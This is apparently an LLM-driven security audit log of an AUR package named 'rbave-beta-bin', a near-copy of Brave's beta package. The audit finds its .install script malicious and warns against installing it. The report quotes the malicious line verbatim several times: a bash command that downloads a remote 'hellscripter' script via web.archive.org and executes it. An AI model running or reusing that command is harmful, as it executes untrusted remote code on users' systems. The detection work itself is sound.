---
package: rbave-beta-bin
pkgver: 1.98.47
pkgrel: 1
result: unsafe
model: deepseek/deepseek-v4-flash
provider: custom
aur_sleuth_rev: e76320400488b1dad2302211f4f5cfaf8522c9b1
prompt_tokens: 22308
completion_tokens: 4017
total_tokens: 26325
cost: 0.002761122
execution_time: 67.55
files_reviewed: 6
files_skipped: 1
maintainer_files: 7
source_fetch: not_attempted
upstream_files: 0
upstream_named_files: 0
unpinned_sources: 0
injection_attempts: 0
date: 2026-10-14T03:06:08Z
file_verdicts:
  - file: .gitignore
    status: safe
    summary: Standard .gitignore with no malicious content.
  - file: .SRCINFO
    status: safe
    summary: Standard metadata file; official sources and pinned checksums. No security issues.
  - file: brave-beta-bin.sh
    status: safe
    summary: Standard launcher script with no malicious code.
  - file: logo.png
    status: skipped
    summary: "Skipping binary file: logo.png"
  - file: PKGBUILD
    status: safe
    summary: Standard PKGBUILD for Brave beta; no signs of malice.
  - file: brave-browser.desktop
    status: safe
    summary: Standard desktop entry; no security issues.
  - file: rbave-beta-bin.install
    status: unsafe
    summary: "Remote code execution via curl|bash during installation"
    evidence: "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)"
    evidence_line: 9
---

Materializing rbave-beta-bin from local mirror...
Materialized rbave-beta-bin
Analyzing rbave-beta-bin AUR package with deepseek/deepseek-v4-flash
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
Running `makepkg --printsrcinfo` sources only the global/top-level scope of this PKGBUILD. That scope contains only standard variable and array assignments: `pkgname`, `pkgver`, `pkgrel`, `pkgdesc`, `arch`, `url`, `license`, `depends`, `optdepends`, `provides`, `conflicts`, `source` arrays, checksum arrays, and `options`. There are no top-level command substitutions, no `eval`, `curl`, `wget`, `base64`, or other executable statements that would run during sourcing. The `prepare()` and `package()` functions are not executed by `makepkg --printsrcinfo`, so their contents are out of scope for this gate.

The `source` URLs point to the upstream Brave GitHub releases, and checksums are provided. Even if they were missing or skipped, that would not affect this specific command because no sources are downloaded during `--printsrcinfo`. No genuinely malicious behavior is present in the top-level code.
</details>
<evidence>
</evidence>
<summary>
Top-level PKGBUILD scope contains only safe standard variable assignments; no malicious code executes during printsrcinfo.
</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- Top-level PKGBUILD scope contains only safe standard variable assignments; no malicious code executes during printsrcinfo.
Reviewing the 7 file(s) in the AUR repository.
Reviewing the AUR repository's files...
[0/7] Reviewing .SRCINFO...
[0/7] Reviewing .SRCINFO, .gitignore...
[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD...
LLM auditresponse for .gitignore:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard `.gitignore` file for an AUR package repository. It ignores all files by default (`*`), then explicitly un-ignores specific files necessary for the AUR package (`PKGBUILD`, `.SRCINFO`, install scripts, desktop file, etc.). There is no malicious code or behavior in this file—it merely defines which files should be tracked by Git, which is standard practice.
</details>
<evidence></evidence>
<summary>Standard .gitignore with no malicious content.</summary>
</security_assessment>

[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD, brave-beta-bin.sh...
[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh...
+ Reviewed .gitignore. Status: SAFE -- Standard .gitignore with no malicious content.
LLM auditresponse for .SRCINFO:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard AUR `.SRCINFO` metadata file for a binary package of Brave Browser beta. It declares the package description, version, dependencies, architecture-specific source URLs, and SHA-512 checksums. No code is present in this file, so there is no opportunity for obfuscation, network calls, file manipulation, or execution. The sources point to the official Brave GitHub releases, and the checksums are pinned rather than skipped, which is good packaging practice. There is nothing here that deviates from normal AUR packaging or indicates malicious behavior.
</details>
<evidence>
</evidence>
<summary>
Standard metadata file; official sources and pinned checksums. No security issues.</summary>
</security_assessment>

[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
+ Reviewed .SRCINFO. Status: SAFE -- Standard metadata file; official sources and pinned checksums. No security issues.
LLM auditresponse for brave-beta-bin.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard wrapper script for launching the Brave Beta browser from a prebuilt binary. It reads optional user flags from a configuration file, sets a default Chrome user data directory, and executes the browser binary. No suspicious network activity, obfuscated code, or unexpected system modifications are present. The script follows typical AUR packaging conventions for a binary package.
</details>
<evidence></evidence>
<summary>Standard launcher script with no malicious code.</summary>
</security_assessment>

[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop, logo.png...
[3/7] Reviewing PKGBUILD, brave-browser.desktop, logo.png...
+ Reviewed brave-beta-bin.sh. Status: SAFE -- Standard launcher script with no malicious code.
[3/7] Reviewing PKGBUILD, brave-browser.desktop, logo.png, rbave-beta-bin.install...
[4/7] Reviewing PKGBUILD, brave-browser.desktop, rbave-beta-bin.install...
! Reviewed logo.png. Status: SKIPPED -- Skipping binary file: logo.png
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
This PKGBUILD follows standard Arch packaging practices for a prebuilt binary package. The source files are fetched over HTTPS from Brave's official GitHub releases repository, and all checksums are pinned (none are `SKIP`). The `prepare()` and `package()` functions only perform routine operations: extracting the .deb archive, deleting unneeded files, patching the desktop file to use a custom launcher script, copying files into the package directory, and setting the correct permissions (including the standard `chmod 4755` on the Chrome sandbox binary). There are no suspicious network requests, obfuscated commands, or unexpected system modifications. The package name &quot;rbave-beta-bin&quot; is unusual but does not indicate malicious intent; it is likely a naming choice by the maintainer. The separate launcher script (`brave-beta-bin.sh`) is referenced but not present in this file, but within the context of this PKGBUILD, no malicious behavior is observed.
</details>
<evidence>
</evidence>
<summary>Standard PKGBUILD for Brave beta; no signs of malice.</summary>
</security_assessment>

[5/7] Reviewing brave-browser.desktop, rbave-beta-bin.install...
+ Reviewed PKGBUILD. Status: SAFE -- Standard PKGBUILD for Brave beta; no signs of malice.
LLM auditresponse for brave-browser.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard .desktop file for the Brave Beta web browser. It contains only localization strings for GenericName and Comment, along with standard desktop entry keys (Exec, Icon, Categories, MimeType). No suspicious network requests, obfuscated code, or dangerous commands are present. The Exec line correctly points to the `brave-beta` binary with URL placeholders. The file poses no security risk.
</details>
<evidence></evidence>
<summary>Standard desktop entry; no security issues.</summary>
</security_assessment>

[6/7] Reviewing rbave-beta-bin.install...
+ Reviewed brave-browser.desktop. Status: SAFE -- Standard desktop entry; no security issues.
LLM auditresponse for rbave-beta-bin.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
The file contains an unconditional arbitrary command execution outside any function: `bash &lt;(curl -L '...' 2&gt;/dev/null)`. This line fetches a shell script from a remote URL (web.archive.org redirecting to gitflic.ru) and immediately pipes it into bash without any integrity check or verification. This is a classic supply chain attack vector that bypasses the package manager's source verification and allows an attacker-controlled script to run with the privileges of the user installing the package. The post_install and post_upgrade hooks are essentially stubs, so the dangerous line is the only real action taken during installation.
</details>
<evidence>
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
</evidence>
<summary>
Remote code execution via curl|bash during installation</summary>
</security_assessment>

Second look for rbave-beta-bin.install (incontext):
<security_assessment>
<decision>UNSAFE</decision>
<details>The first verdict stands. The file `rbave-beta-bin.install` contains a `bash <(curl -L ...)` command that is placed **outside any function**, meaning it executes immediately when the script is sourced by pacman during install, upgrade, or removal. It fetches a shell script from `web.archive.org`/`gitflic.ru` – a host unrelated to the package’s upstream – and runs it without any verification. This is exactly the pattern described in rule 4 as *“Downloading code or binaries from an untrusted/unexpected host and executing them (e.g. curl|bash)”* and is a classic supply‑chain injection. This is not upstream application functionality (the file is part of the AUR packaging, not the upstream tarball), nor is it any standard AUR practice listed in rule 5. The malicious code was injected by the AUR maintainer.</details>
<evidence>bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)</evidence>
<summary>Remote arbitrary code execution via curl|bash in install script</summary>
</security_assessment>

[7/7] Reviewing ...
x Reviewed rbave-beta-bin.install. Status: UNSAFE -- Remote code execution via curl|bash during installation
Reviewed all the AUR repository's files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## rbave-beta-bin.install

Status: UNSAFE

Summary: Remote code execution via curl|bash during installation

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

The file contains an unconditional arbitrary command execution outside any function: `bash <(curl -L '...' 2>/dev/null)`. This line fetches a shell script from a remote URL (web.archive.org redirecting to gitflic.ru) and immediately pipes it into bash without any integrity check or verification. This is a classic supply chain attack vector that bypasses the package manager's source verification and allows an attacker-controlled script to run with the privileges of the user installing the package. The post_install and post_upgrade hooks are essentially stubs, so the dangerous line is the only real action taken during installation.

---

(Skipped 1 file: logo.png)

API Usage Summary
  Models: deepseek/deepseek-v4-flash
  Prompt Tokens: 22,308
  Completion Tokens: 4,017
  Total Tokens: 26,325
  Total Cost: $0.002761
  Execution Time: 67.55 seconds

Final Status: UNSAFE


Issues Found:

rbave-beta-bin.install: [UNSAFE] Remote code execution via curl|bash during installation / The file contains an unconditional arbitrary command execution outside any function: `bash <(curl -L '...' 2>/dev/null)`. This line fetches a shell script from a remote URL (web.archive.org redirecting to gitflic.ru) and immediately pipes it into bash without any integrity check or verification. This is a classic supply chain attack vector that bypasses the package manager's source verification and allows an attacker-controlled script to run with the privileges of the user installing the package. The post_install and post_upgrade hooks are essentially stubs, so the dangerous line is the only real action taken during installation.


Audit Skips:

logo.png: [SKIPPED] Skipping binary file: logo.png
